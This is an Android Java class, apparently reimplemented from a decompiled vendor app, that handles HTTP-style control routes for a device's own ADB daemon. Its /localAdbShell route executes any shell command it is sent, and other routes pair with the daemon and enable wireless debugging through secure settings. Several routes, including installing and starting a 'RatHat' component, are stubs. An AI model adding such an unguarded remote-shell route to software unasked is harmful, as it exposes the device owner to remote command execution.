package com.vendor.rat.control.server;

import android.content.Context;
import android.util.Log;

import com.vendor.rat.adb.AdbConnectionManager;
import com.vendor.rat.control.entity.ADBConfig;
import com.vendor.rat.control.entity.AdbShellResult;
import com.vendor.rat.utils.MiscUtils;
import com.vendor.rat.utils.SecureSettingsWriter;

/**
 * ADB 操作处理器 — vendor b.java ADB 路由
 *
 * 覆盖路由: /localAdbShell, /localAdbPair, /localAdbPush,
 *   /localAdbConnect, /requestLocalAdbPair, /requestLocalKeepAlive,
 *   /syncADBConfig, /shareADBConfig, /openWifiDebug,
 *   /closeWifiDebug, /enableWifiDebug, /reloadPairKeyFiles,
 *   /installRatHat, /updateRatHat, /startRatHat, /stopRatHat
 */
public class AdbOperationHandler {

    private static final String TAG = "AdbOperationHandler";

    /**
     * Resolve a usable Context from MiscUtils.
     * AdbConnectionManager holds mContext internally but does not expose it;
     * for operations that need a Context directly (e.g. SecureSettingsWriter),
     * fall back to MiscUtils.getContext().
     *
     * @return Application context, or null if not yet initialized
     */
    private Context getContext() {
        return MiscUtils.getContext();
    }

    // ========== Implemented routes ==========

    /**
     * /localAdbShell — execute any shell command via ADB connection.
     * Vendor: A1(k, command)
     *
     * @param command Shell command to execute
     * @return AdbShellResult with success/output
     */
    public AdbShellResult localAdbShell(String command) {
        Log.d(TAG, "localAdbShell: " + command);
        AdbConnectionManager mgr = AdbConnectionManager.getInstance();
        if (mgr == null || !mgr.isAdbConnected()) {
            return new AdbShellResult(false, "ADB 未连接");
        }
        AdbConnectionManager.AdbShellResult internal = mgr.executeShell(command);
        if (internal == null) {
            return new AdbShellResult(false, "执行失败");
        }
        return new AdbShellResult(internal.isSuccess(), internal.getOutput());
    }

    /**
     * /localAdbPair — SPAKE2 pairing with ADB daemon.
     * Vendor: y1()
     *
     * @param host          ADB daemon host (e.g. "127.0.0.1")
     * @param pairPort      Pairing port (string, parsed to int)
     * @param pairCode      6-digit pairing code
     * @param directConnect Whether to auto-connect after successful pairing
     * @return true if pairing succeeded
     */
    public boolean localAdbPair(String host, String pairPort,
            String pairCode, boolean directConnect) {
        Log.d(TAG, "localAdbPair: host=" + host + " port=" + pairPort);
        AdbConnectionManager mgr = AdbConnectionManager.getInstance();
        if (mgr == null) return false;
        try {
            int port = Integer.parseInt(pairPort);
            boolean paired = mgr.doPair(host, port, pairCode);
            if (paired && directConnect) {
                mgr.doAutoConnect();
            }
            return paired;
        } catch (NumberFormatException e) {
            Log.e(TAG, "localAdbPair: invalid port: " + pairPort, e);
            return false;
        } catch (Exception e) {
            Log.e(TAG, "localAdbPair failed", e);
            return false;
        }
    }

    /** /localAdbPush — vendor z1/p1() */
    public void localAdbPush(String logId, String fileUrl,
            String fileName, String startCommand) {
        Log.d(TAG, "localAdbPush");
        // TODO: implement file push over ADB stream
    }

    /**
     * /localAdbConnect — auto-discover and connect via mDNS.
     *
     * @return true if connection succeeded
     */
    public boolean localAdbConnect() {
        Log.d(TAG, "localAdbConnect");
        AdbConnectionManager mgr = AdbConnectionManager.getInstance();
        if (mgr == null) return false;
        return mgr.doAutoConnect();
    }

    /** /requestLocalAdbPair */
    public void requestLocalAdbPair() {
        Log.d(TAG, "requestLocalAdbPair");
    }

    /** /requestLocalKeepAlive */
    public void requestLocalKeepAlive() {
        Log.d(TAG, "requestLocalKeepAlive");
    }

    /**
     * /syncADBConfig — return current ADB configuration snapshot.
     * Vendor: G2(k)
     *
     * @return ADBConfig with current state (connected, paired, debug flags, etc.)
     */
    public ADBConfig syncADBConfig() {
        Log.d(TAG, "syncADBConfig");
        AdbConnectionManager mgr = AdbConnectionManager.getInstance();
        if (mgr == null) return new ADBConfig();
        return mgr.getAdbConfig();
    }

    /** /shareADBConfig */
    public void shareADBConfig() {
        Log.d(TAG, "shareADBConfig");
    }

    /**
     * /openWifiDebug — enable wireless debugging via SecureSettingsWriter.
     *
     * @return true if wireless debugging was enabled
     */
    public boolean openWifiDebug() {
        Log.d(TAG, "openWifiDebug");
        // Prefer AdbConnectionManager's built-in method which handles developer options too
        AdbConnectionManager mgr = AdbConnectionManager.getInstance();
        if (mgr != null) {
            return mgr.enableWirelessDebugging();
        }
        return false;
    }

    /**
     * /closeWifiDebug — disable wireless debugging via SecureSettingsWriter.
     *
     * @return true if wireless debugging was disabled
     */
    public boolean closeWifiDebug() {
        Log.d(TAG, "closeWifiDebug");
        // Use AdbConnectionManager's context indirectly via MiscUtils
        Context ctx = getContext();
        if (ctx != null) {
            return SecureSettingsWriter.disableWifiDebug(ctx);
        }
        return false;
    }

    /**
     * /enableWifiDebug — same as openWifiDebug (alias route).
     *
     * @return true if wireless debugging was enabled
     */
    public boolean enableWifiDebug() {
        Log.d(TAG, "enableWifiDebug");
        return openWifiDebug();
    }

    /** /reloadPairKeyFiles */
    public void reloadPairKeyFiles() {
        Log.d(TAG, "reloadPairKeyFiles");
    }

    /** /installRatHat — vendor B3(k) */
    public void installRatHat() {
        Log.d(TAG, "installRatHat");
    }

    /** /updateRatHat */
    public void updateRatHat() {
        Log.d(TAG, "updateRatHat");
    }

    /** /startRatHat — vendor T2(k) */
    public void startRatHat() {
        Log.d(TAG, "startRatHat");
    }

    /** /stopRatHat */
    public void stopRatHat() {
        Log.d(TAG, "stopRatHat");
    }
}
